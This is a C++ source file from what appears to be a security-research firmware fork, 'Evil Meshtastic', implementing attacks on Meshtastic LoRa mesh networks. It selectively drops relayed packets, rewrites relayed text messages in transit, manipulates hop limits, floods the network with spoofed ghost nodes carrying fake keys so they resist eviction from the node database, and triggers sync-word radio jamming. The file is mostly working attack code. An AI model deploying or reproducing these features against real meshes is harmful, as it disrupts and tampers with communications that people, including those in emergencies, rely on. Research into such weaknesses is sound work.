/**
 * EvilNode.cpp — Evil Node feature implementations
 *
 * All code in this file is compiled only when EVIL_NODE is defined.
 * See EvilNode.h for full feature documentation and build flags.
 *
 * Project: Evil Meshtastic — DefCon 2026 HRV security research
 */

#ifdef EVIL_NODE

#include "EvilNode.h"
#include "MeshService.h"
#include "MeshTypes.h"
#include "NodeDB.h"
#include "Router.h"
#include "configuration.h"
#include "mesh-pb-constants.h"
#include "mesh/generated/meshtastic/mesh.pb.h"
#include "mesh/generated/meshtastic/portnums.pb.h"
#include <pb_encode.h>
#include <string.h>

#ifdef EVIL_SYNCWORD_JAM
#include "RadioLibInterface.h"
#endif

// Platform random number source
#ifdef ARCH_ESP32
#include <esp_random.h>
static inline uint32_t evil_random() { return esp_random(); }
#elif defined(__linux__) || defined(PORTDUINO)
#include <fcntl.h>
#include <unistd.h>
static inline uint32_t evil_random()
{
    uint32_t val = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) { read(fd, &val, sizeof(val)); close(fd); }
    return val ? val : (uint32_t)rand();
}
#else
#include <stdlib.h>
static inline uint32_t evil_random() { return (uint32_t)rand(); }
#endif

// ─────────────────────────────────────────────────────────────────────────────
// Runtime state — initialised from compile-time defaults in EvilNode.h
// ─────────────────────────────────────────────────────────────────────────────

EvilNode::RuntimeState EvilNode::state;

// ─────────────────────────────────────────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────────────────────────────────────────

static bool isTextPacket(const meshtastic_MeshPacket *p)
{
    return p->which_payload_variant == meshtastic_MeshPacket_decoded_tag &&
           p->decoded.portnum == meshtastic_PortNum_TEXT_MESSAGE_APP &&
           p->decoded.payload.size > 0;
}
// isFromUs() is provided by MeshTypes.h / meshUtils

// ROT-13 a single ASCII character (letters only, case-preserving)
static char rot13_char(char c)
{
    if (c >= 'a' && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if (c >= 'A' && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

// In-place ROT-13 of a byte buffer (ASCII letters only)
static void rot13_buf(uint8_t *buf, size_t len)
{
    for (size_t i = 0; i < len; i++)
        buf[i] = (uint8_t)rot13_char((char)buf[i]);
}

// In-place reversal of a byte buffer (always compiled in — used by runtime transform=2)
static void reverse_buf(uint8_t *buf, size_t len)
{
    for (size_t i = 0, j = len - 1; i < j; i++, j--) {
        uint8_t tmp = buf[i];
        buf[i] = buf[j];
        buf[j] = tmp;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// shouldDrop — selective packet dropping
// ─────────────────────────────────────────────────────────────────────────────

bool EvilNode::shouldDrop(const meshtastic_MeshPacket *p)
{
    // Never drop our own packets
    if (isFromUs(p))
        return false;

    if (state.drop_node != 0 && p->from == state.drop_node) {
        LOG_DEBUG("DROP: packet from target node 0x%08x", p->from);
        return true;
    }

    if (state.drop_channel != 255 && p->channel == state.drop_channel) {
        LOG_DEBUG("DROP: packet on channel %d", p->channel);
        return true;
    }

    if (state.drop_rate > 0) {
        uint32_t r = evil_random() % 100;
        if (r < state.drop_rate) {
            LOG_DEBUG("DROP: random drop (%d%% rate)", state.drop_rate);
            return true;
        }
    }

    return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// transformPacket — decrypt-modify-re-encrypt MitM pipeline
// ─────────────────────────────────────────────────────────────────────────────

void EvilNode::transformPacket(meshtastic_MeshPacket *p)
{
    if (state.transform == 0)
        return;

    // Only transform relay packets (not from us)
    if (isFromUs(p))
        return;
    if (!isTextPacket(p))
        return;

    uint8_t *payload = p->decoded.payload.bytes;
    size_t   len     = p->decoded.payload.size;

    if (len == 0)
        return;

    LOG_DEBUG("TRANSFORM: mode=%d packet from 0x%08x len=%d", state.transform, p->from, len);

    switch (state.transform) {
    case 1: // ROT-13
        rot13_buf(payload, len);
        LOG_DEBUG("TRANSFORM: ROT-13 applied");
        break;

    case 2: // Reverse
        reverse_buf(payload, len);
        LOG_DEBUG("TRANSFORM: reverse applied");
        break;

    case 3: { // Suffix
        size_t sfx_len   = strlen(state.suffix);
        size_t max_bytes = sizeof(p->decoded.payload.bytes);
        if (sfx_len > 0 && len + sfx_len < max_bytes) {
            memcpy(payload + len, state.suffix, sfx_len);
            p->decoded.payload.size = (pb_size_t)(len + sfx_len);
            LOG_DEBUG("TRANSFORM: suffix appended (%d bytes total)", p->decoded.payload.size);
        } else if (sfx_len > 0) {
            LOG_WARN("TRANSFORM: suffix would overflow payload buffer, skipping");
        }
        break;
    }

    default:
        break;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// manipulateHopLimit — hop limit manipulation on relayed packets
// ─────────────────────────────────────────────────────────────────────────────

void EvilNode::manipulateHopLimit(meshtastic_MeshPacket *tosend)
{
    if (state.hop_mode == 1 && tosend->hop_limit < 7) {
        LOG_DEBUG("HOP_MAX: raising hop_limit %d → 7", tosend->hop_limit);
        tosend->hop_limit = 7;
    } else if (state.hop_mode == 2 && tosend->hop_limit > 0) {
        LOG_DEBUG("HOP_KILL: killing hop_limit %d → 0", tosend->hop_limit);
        tosend->hop_limit = 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// floodNodeInfo — NodeDB exhaustion attack
// ─────────────────────────────────────────────────────────────────────────────

// Ghost node name templates — varied enough to look like real node names
static const char *ghost_adjectives[] = {
    "Angry", "Brave", "Calm", "Dark", "Eerie", "Fast", "Grim", "Hasty",
    "Idle", "Jolly", "Keen", "Lazy", "Mean", "Noisy", "Odd", "Pale",
    "Quick", "Rusty", "Shady", "Tiny", "Ugly", "Vile", "Wily", "Xenon",
    "Yucky", "Zany", "Bleak", "Crisp", "Damp", "Dusty",
};
static const char *ghost_nouns[] = {
    "Node", "Ghost", "Relay", "Packet", "Mesh", "Ninja", "Rogue", "Shade",
    "Wraith", "Phantom", "Specter", "Shadow", "Demon", "Sprite", "Wanderer",
    "Lurker", "Stalker", "Drifter", "Nomad", "Exile",
};
static constexpr int N_ADJ  = sizeof(ghost_adjectives) / sizeof(ghost_adjectives[0]);
static constexpr int N_NOUN = sizeof(ghost_nouns) / sizeof(ghost_nouns[0]);

static void build_ghost_name(char *buf, size_t buflen, uint32_t seed)
{
    const char *adj  = ghost_adjectives[seed % N_ADJ];
    const char *noun = ghost_nouns[(seed >> 8) % N_NOUN];
    snprintf(buf, buflen, "%s %s %04x", adj, noun, (unsigned)(seed & 0xFFFF));
}

void EvilNode::floodNodeInfo()
{
#ifndef EVIL_ALLOW_FROM_OVERRIDE
    LOG_WARN("floodNodeInfo: EVIL_ALLOW_FROM_OVERRIDE is not enabled — from spoofing blocked");
    return;
#endif

    uint32_t count = (state.flood_count > 0 && state.flood_count <= 200) ? state.flood_count : 200;
    LOG_INFO("FLOOD: starting NodeInfo flood (%d packets, keys=%d)", count, state.flood_keys);

    for (uint32_t i = 0; i < count; i++) {
        uint32_t fake_node_id = evil_random();
        // Avoid 0, broadcast (0xFFFFFFFF), and our own node ID
        if (fake_node_id == 0 || fake_node_id == 0xFFFFFFFF || fake_node_id == nodeDB->getNodeNum()) {
            i--;
            continue;
        }

        // Build a User protobuf
        meshtastic_User ghost_user = meshtastic_User_init_zero;
        snprintf(ghost_user.id, sizeof(ghost_user.id), "!%08x", fake_node_id);

        char name_buf[40];
        build_ghost_name(name_buf, sizeof(name_buf), fake_node_id);
        strncpy(ghost_user.long_name, name_buf, sizeof(ghost_user.long_name) - 1);

        // Short name: first 4 chars of adj + node hex nibble
        ghost_user.short_name[0] = name_buf[0];
        ghost_user.short_name[1] = name_buf[1];
        snprintf(ghost_user.short_name + 2, 3, "%02x", (unsigned)(fake_node_id & 0xFF));

        ghost_user.hw_model = meshtastic_HardwareModel_UNSET;
        ghost_user.is_licensed = false;

        if (state.flood_keys) {
            // Include a fake 32-byte public key — makes the node harder to evict
            // (eviction logic prefers to remove nodes without public keys)
            ghost_user.public_key.size = 32;
            for (int k = 0; k < 32; k++)
                ghost_user.public_key.bytes[k] = (uint8_t)(evil_random() >> (k % 24));
        }

        // Allocate a MeshPacket and encode the User into it
        meshtastic_MeshPacket *p = packetPool.allocZeroed();
        if (!p) {
            LOG_WARN("FLOOD: packet pool exhausted at i=%d", i);
            break;
        }

        p->which_payload_variant = meshtastic_MeshPacket_decoded_tag;
        p->from   = fake_node_id;          // Spoofed source — requires EVIL_ALLOW_FROM_OVERRIDE
        p->to     = NODENUM_BROADCAST;
        p->id     = generatePacketId();
        p->channel = 0;                    // Primary channel
        p->hop_limit = 3;
        p->hop_start = 3;
        p->decoded.portnum = meshtastic_PortNum_NODEINFO_APP;
        p->decoded.want_response = false;

        p->decoded.payload.size = pb_encode_to_bytes(
            p->decoded.payload.bytes, sizeof(p->decoded.payload.bytes),
            &meshtastic_User_msg, &ghost_user);

        if (p->decoded.payload.size == 0) {
            LOG_WARN("FLOOD: User encode failed at i=%d", i);
            packetPool.release(p);
            continue;
        }

        LOG_DEBUG("FLOOD: sending ghost node !%08x '%s'", fake_node_id, ghost_user.long_name);
        service->sendToMesh(p);

        // Small delay to avoid overwhelming the TX queue (16 slots)
        // At 3 hops + LoRa airtime, ~250ms per packet is reasonable
        delay(300);
    }

    LOG_INFO("FLOOD: completed NodeInfo flood");
}

// ─────────────────────────────────────────────────────────────────────────────
// syncWordJam — LoRa sync-word PHY jamming
// ─────────────────────────────────────────────────────────────────────────────

void EvilNode::syncWordJam(uint32_t durationMs)
{
#ifdef EVIL_SYNCWORD_JAM
    if (RadioLibInterface::instance) {
        RadioLibInterface::instance->evilSyncWordJam(durationMs);
    } else {
        LOG_WARN("EvilNode: sync-word jam requested but no RadioLib radio is present");
    }
#else
    (void)durationMs;
    LOG_WARN("EvilNode: sync-word jam requested but EVIL_SYNCWORD_JAM not compiled in");
#endif
}

#endif // EVIL_NODE
